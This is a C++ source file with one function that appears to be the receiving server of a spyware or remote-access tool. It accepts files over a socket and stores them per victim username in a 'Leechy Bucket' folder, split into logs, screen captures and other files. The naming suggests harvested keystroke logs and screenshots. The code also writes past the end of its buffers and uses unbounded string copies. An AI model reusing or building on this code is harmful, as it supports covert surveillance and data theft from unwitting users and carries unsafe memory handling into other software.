#include "Server.h"

string transfer(SOCKET& asock, char *username, int cur, int tot, string mode)
{
     char command[1024], response[16384], fn[1024], nfn[1024], lftn[1024], fullname[1024], detn[1024], temp[1024];
     int res, size, cc;
     string totr, rval;
     DWORD attr;

     do
     {
                  res = recv(asock, response, 16384, 0);
                  response[res] = '\0';
                  totr += response;
     } while (totr[totr.length() - 1] != '+');
     totr.erase(totr.length() - 1, 1);
     strncpy(fn, totr.c_str(),1024);
     
     strncpy(command, "OK+",1024);
     send(asock, command, (int)strlen(command), 0);
     
     totr.clear();
     do
     {
                  res = recv(asock, response, 16384, 0);
                  response[res] = '\0';
                  totr += response;
     } while (totr[totr.length() - 1] != '+');
     totr.erase(totr.length() - 1, 1);
     size = atoi(totr.c_str());
     
     GetEnvironmentVariable("USERPROFILE", fullname, 1024);
     strcat(fullname, "\\Dropbox\\Geek\\Leechy Bucket\\");
     strcat(fullname, username);
     attr = GetFileAttributes(fullname);
     if (attr == INVALID_FILE_ATTRIBUTES) CreateDirectory(fullname, NULL);
     if (mode == "LG") strcat(fullname, "\\Logs");
     else if (mode == "SC") strcat(fullname, "\\Screens");
     else strcat(fullname, "\\Files");
     attr = GetFileAttributes(fullname);
     if (attr == INVALID_FILE_ATTRIBUTES) CreateDirectory(fullname, NULL);
     strcat(fullname, "\\");
     if ((mode == "LG") || (mode == "SC"))
     {
               lftn[0] = fn[0]; lftn[1] = fn[1]; lftn[2] = '~'; lftn[3] = fn[2];
               lftn[4] = fn[3]; lftn[5] = '~'; lftn[6] = fn[4]; lftn[7] = fn[5];
               strncpy(lftn + 8, " at ",1016); lftn[12] = fn[6]; lftn[13] = fn[7];
               lftn[14] = '.'; lftn[15] = fn[8]; lftn[16] = fn[9];
     }
     if (mode == "LG")
     {
              lftn[17] = '\0';
              strncpy(detn, lftn,1024);
              strcat(lftn, " .txt");
              detn[0] = lftn[6]; detn[1] = lftn[7]; detn[6] = lftn[0]; detn[7] = lftn[1]; detn[2] = '/'; detn[5] = '/'; detn[14] = ':';
              cout << " downloading file " << cur << " of " << tot << " (log started on " << detn << ")  ...  ";
     }
     else if (mode == "SC")
     {
          lftn[17] = '.'; lftn[18] = fn[10]; lftn[19] = fn[11];
          lftn[20] = '\0';
          strncpy(detn, lftn,1024);
          strcat(lftn, " .jpg");
          detn[0] = lftn[6]; detn[1] = lftn[7]; detn[6] = lftn[0]; detn[7] = lftn[1]; detn[2] = '/'; detn[5] = '/'; detn[14] = ':'; detn[17] = ':';
          cout << " downloading file " << cur << " of " << tot << " (screen captured on " << detn << ")  ...  ";
     }
     if ((mode == "LG") || (mode == "SC")) strcat(fullname, lftn);
     else
     {
         strncpy(temp, fullname,1024);
         sprintf(fullname, "%s%s", temp, fn);
         cc = 1;
         while (INVALID_FILE_ATTRIBUTES != GetFileAttributes(fullname))
         {
               sprintf(nfn, "(#%d) %s", cc ++, fn);
               sprintf(fullname, "%s%s", temp, nfn);
         }
     }
     
     strncpy(command, "OK+",1024);
     send(asock, command, (int)strlen(command), 0);
     
     FILE * target;
     target = fopen(fullname, "wb");
     int totalres = 0;
     do
     {
              res = recv(asock, response, 16384, 0);
              fwrite(response, 1, res, target);
              fflush(target);
              totalres += res;
     } while (totalres < size);
     
     cout << "complete." << endl;
     
     strncpy(command, "OK+",1024);
     send(asock, command, (int)strlen(command), 0);
     
     fclose(target);
     rval = fullname;
     
     return rval;
}
